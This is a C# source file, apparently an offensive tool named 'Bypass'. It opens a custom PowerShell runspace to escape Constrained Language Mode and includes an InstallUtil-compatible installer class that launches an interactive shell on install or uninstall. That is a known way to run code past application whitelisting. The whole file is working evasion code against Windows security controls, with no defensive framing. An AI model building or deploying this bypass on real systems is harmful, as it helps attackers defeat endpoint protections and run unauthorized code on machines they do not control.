using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
#if DLL
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.Runtime.InteropServices;
#endif

namespace Bypass
{
#if !DLL
    class Entry
    {
        static void Main()
        {
            Shell.Run();
        }
    }
#endif

#if DLL
    [RunInstaller(true)]
    public class Loader : Installer
    {
        [DllImport("kernel32")]
        private static extern bool AllocConsole();

        public override void Install(IDictionary state)
        {
            AllocConsole();
            Shell.Run();
        }

        public override void Uninstall(IDictionary state)
        {
            AllocConsole();
            Shell.Run();
        }
    }
#endif

    public class Shell
    {
        public static void Run()
        {
            try
            {
#if FULL
                InitialSessionState iss = InitialSessionState.CreateDefault();
#else
                InitialSessionState iss = InitialSessionState.CreateDefault2();
#endif
                using (Runspace rs = RunspaceFactory.CreateRunspace(iss))
                {
                    rs.Open();

                    string mode = Exec(rs, "$ExecutionContext.SessionState.LanguageMode");
                    string ver  = Exec(rs, "$PSVersionTable.PSVersion");
                    string user = Exec(rs, "[Security.Principal.WindowsIdentity]::GetCurrent().Name");

                    Console.WriteLine("[+] LanguageMode: " + mode);
                    Console.WriteLine("[+] PSVersion:    " + ver);
                    Console.WriteLine("[+] User:         " + user);

                    if (mode != "FullLanguage")
                    {
                        Console.WriteLine("[-] WARNING: still in " + mode + " (WDAC may override)");
                    }

#if FULL
                    Exec(rs, "$env:PSModulePath = $PSHOME + '\\Modules';"
                           + "Import-Module Microsoft.PowerShell.Management -ea 0;"
                           + "Import-Module Microsoft.PowerShell.Utility -ea 0;"
                           + "Import-Module Microsoft.PowerShell.Security -ea 0");
                    Console.WriteLine("[+] Core modules loaded");
#else
                    Console.WriteLine("[*] Slim: basic cmdlets only. Import-Module for more.");
#endif

                    string cwd = Exec(rs, "[Environment]::CurrentDirectory");

                    while (true)
                    {
                        Console.Write("PS " + cwd + "> ");
                        string input = Console.ReadLine();
                        if (input == null) break;
                        if (input.Trim().Length == 0) continue;
                        if (input.Trim().Equals("exit", StringComparison.OrdinalIgnoreCase)) break;

                        using (PowerShell ps = PowerShell.Create())
                        {
                            ps.Runspace = rs;
                            ps.AddScript(input);
                            ps.AddCommand("Out-String");
                            try
                            {
                                Collection<PSObject> results = ps.Invoke();
                                foreach (PSObject r in results)
                                {
                                    if (r != null)
                                    {
                                        string s = r.ToString();
                                        if (s.Length > 0) Console.Write(s);
                                    }
                                }
                                foreach (ErrorRecord err in ps.Streams.Error)
                                    Console.Error.WriteLine(err.ToString());
                                foreach (WarningRecord w in ps.Streams.Warning)
                                    Console.WriteLine("WARNING: " + w.Message);
                            }
                            catch (Exception ex)
                            {
                                Console.Error.WriteLine(ex.Message);
                            }
                        }

                        string newCwd = Exec(rs, "try{(Get-Location).Path}catch{[Environment]::CurrentDirectory}");
                        if (newCwd.Length > 0) cwd = newCwd;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[-] " + ex.Message);
            }
        }

        private static string Exec(Runspace rs, string script)
        {
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = rs;
                ps.AddScript(script);
                Collection<PSObject> r = ps.Invoke();
                return r.Count > 0 && r[0] != null ? r[0].ToString().Trim() : "";
            }
        }
    }
}
